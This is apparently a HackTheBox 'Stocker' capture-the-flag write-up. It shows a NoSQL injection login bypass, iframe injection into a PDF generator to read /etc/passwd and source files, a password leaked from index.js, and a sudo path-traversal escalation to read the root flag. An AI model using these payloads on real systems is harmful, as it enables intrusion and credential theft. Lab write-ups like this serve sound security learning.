# Reconnaissance

## Port Scan (nmap)
We first perform a nmap portscan.

Command: *sudo nmap -sC -sV -p- 10.10.11.196 -oA nmap/stocker*

![image](https://user-images.githubusercontent.com/85443537/227789860-18a04fd7-ecf2-4c0c-8f86-4ca7f3a12e03.png)

we can see port 80 is open and it does not follow the redirect to http://stocker.htb.
We add http://stocker.htb to */etc/hosts* file.

We navigate to stocker.htb but find nothing interesting.

## VHost Scan (gobuster
We run gobuster to scan if there are other domain running on the same IP using the following command:

Command: *gobuster vhost -u http://stocker.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --append-domain

![image](https://user-images.githubusercontent.com/85443537/227790247-20495fca-104e-4920-9249-17fce38cf1dc.png)

We find the domain *dev.stocker.htb*. We proceed to add it to the */etc/hosts* file.

Once we enter the newly found domain, we are presented with a login page.

![image](https://user-images.githubusercontent.com/85443537/227790349-d8fad7a5-f93b-4a3e-aff4-f09c2625f8ec.png)

Trying default credentials does not work.

We then capture the request in burpsuite with intercept.

![image](https://user-images.githubusercontent.com/85443537/227790436-b1880de6-171b-4c4a-a8b1-291e883c5298.png)

We save the request to a file, and run it with sqlmap but with no results. This means that the server might be using NoSQL.

# NoSQL Injection

We go back to burpsuite to our previous login POST request. We search on google for nosql injection and we find this resource https://book.hacktricks.xyz/pentesting-web/nosql-injection.

We find this:

![image](https://user-images.githubusercontent.com/85443537/227790669-5d073710-341b-4a56-8459-e9c3576a0ce7.png)

We try to use the JSON version of the injection. We try the first line of the JSON injection (*{"username": {"$ne": null}, "password": {"$ne": null} }*). We also have to change the *Content-Type* in the POST request to application/json.
The POST request should look like this:

![image](https://user-images.githubusercontent.com/85443537/227790884-217b9d57-74e8-47ce-ac17-34e25acbbae6.png)

Then we forward the requst and we are logged in and presented with this page:

![image](https://user-images.githubusercontent.com/85443537/227790942-71969c58-8322-47fb-9fcf-680f9b5153c5.png)

## Exploiting PDF Converter

In this step we add an item to the cart and then we view cart. We use burpsuite to intercept traffic and press *Submit Purchase*. In burp we get the following POST request:

![image](https://user-images.githubusercontent.com/85443537/227791065-ae58ad13-413b-4eb2-92b0-3361fe20bd0f.png)

Since it is giving us a pdf file when submiting purchase and downloading the pdf, we can try to inject one of the parameters of the object. We try to perform a tag injection in the title parameter to fetch data from the target machine using the following command:

Add to Parameter: *<iframe width=1000px height=1000px src='/etc/passwd'></iframe>*

![image](https://user-images.githubusercontent.com/85443537/227791746-2bad3cc7-3ace-49c1-9c49-da7403e4c33b.png)

We then forward the request and press the blue highlighted text.

![image](https://user-images.githubusercontent.com/85443537/227791814-355e91b4-0d8f-4c93-879a-c333b3f928ec.png)

Once we open the generated PDF we can see our file is included.

![image](https://user-images.githubusercontent.com/85443537/227791854-1993453d-6d6c-4551-9657-291d7617929c.png)

Further investigation into the passwd file shows the user *angoose*.

We then look at another file to see the configuration file of nginx using the below request:

![image](https://user-images.githubusercontent.com/85443537/227792934-3ae5cf66-0faa-4bea-821f-f8b94be6aee2.png)

We get the configuration, but the important part is the *Virtual Host Configs* that we use because we are on the dev domain.

![image](https://user-images.githubusercontent.com/85443537/227792988-6740c707-4854-4747-8cd9-ac5fc8396c30.png)

We can see the directory it is using, */var/www/dev*

Going back to burpsuite we can use the information we gathered and try different files in the */var/www/dev* directory (usually index.js is default).

We inject the iframe tag into the title parameter of the POST request again.

Add to Parameter: <iframe width=800px height=1050px src='/var/www/dev/index.js'></iframe>

![image](https://user-images.githubusercontent.com/85443537/227793163-4f93798e-7767-4206-8fc2-9810b1d0dc49.png)

We get some credentials when opening the pdf.

![image](https://user-images.githubusercontent.com/85443537/227793228-0a58ebd7-9eab-4c74-8888-27b61fb6d7bd.png)

Password: *IHeardPassphrasesArePrettySecure*

Since we recieved the user *angoose* we can try the recently aquired password and try to ssh into the user.

We succefully log into to the user and aquire the *user.txt* flag.

![image](https://user-images.githubusercontent.com/85443537/227793449-0b6b5abe-c9c4-4336-9047-8d83cf5dc0a8.png)

## Inside the angoose SSH shell

We type the command *sudo -l* to display what we can run as sudo using angoose user.
We find that we can use */usr/bin/node usr/local/scripts/*.js* to read files with root permission.

![image](https://user-images.githubusercontent.com/85443537/227794154-5f45da8b-0dc7-418c-86f2-7cb49dcfdb3a.png)

We create a new file in angoose directory and call it *esc.js*.
We then paste the following code and save the file.

const fs = require('fs')\
fs.readFile('/root/root.txt', 'utf8', (err, data) => {\
   if (err) throw err;\
      console.log(data);\
})


We run the following command to read *root.txt* flag using our javascript:

Command: *sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/esc.js*

![image](https://user-images.githubusercontent.com/85443537/227794600-ee312f43-a99f-463e-a9e7-986aa4592e52.png)




# Goals

* USER FLAG: 191476b128dd6b641b7c5721cfb8646b
* ROOT FLAG: fe430503d2545b9a19898a284f404c5a

